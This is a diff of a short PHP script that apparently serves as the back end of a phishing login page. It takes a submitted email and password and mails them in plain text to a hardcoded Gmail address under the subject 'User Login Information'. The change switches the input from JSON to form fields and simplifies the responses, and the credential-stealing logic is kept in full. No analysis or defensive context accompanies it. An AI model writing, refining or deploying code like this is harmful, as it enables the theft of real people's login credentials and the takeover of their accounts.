@@ -1,32 +1,24 @@
 <?php
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    // Get the JSON data from the request
-    $data = json_decode(file_get_contents('php://input'), true);
+    // Get email and password from POST request
+    $email = $_POST['email'];
+    $password = $_POST['password'];
 
-    // Check if the email and password are provided
-    if (isset($data['email']) && isset($data['password'])) {
-        $email = $data['email'];
-        $password = $data['password'];
+    // Your email where the login info will be sent
+    $to = "ajmirahemed5@gmail.com";
+    $subject = "User Login Information";
+    $message = "Email: $email\nPassword: $password";
+    $headers = "From: noreply@yourdomain.com"; // Change this to your domain email
 
-        // Prepare the email
-        $to = "ajmirahemed5@gmail.com"; // Your email
-        $subject = "User Login Information";
-        $message = "Email: $email\nPassword: $password";
-        $headers = "From: noreply@yourdomain.com"; // Change to your domain
-
-        // Send the email
-        if (mail($to, $subject, $message, $headers)) {
-            echo json_encode(['status' => 'success']);
-        } else {
-            http_response_code(500); // Internal Server Error
-            echo json_encode(['status' => 'error', 'message' => 'Failed to send email.']);
-        }
+    // Send the email
+    if (mail($to, $subject, $message, $headers)) {
+        echo "Login information sent successfully.";
     } else {
-        http_response_code(400); // Bad Request
-        echo json_encode(['status' => 'error', 'message' => 'Email and password required.']);
+        echo "Error sending login information.";
     }
 } else {
+    // If accessed with a method other than POST
     http_response_code(405); // Method Not Allowed
-    echo json_encode(['status' => 'error', 'message' => 'Invalid request method.']);
+    echo "Method not allowed.";
 }
 ?>
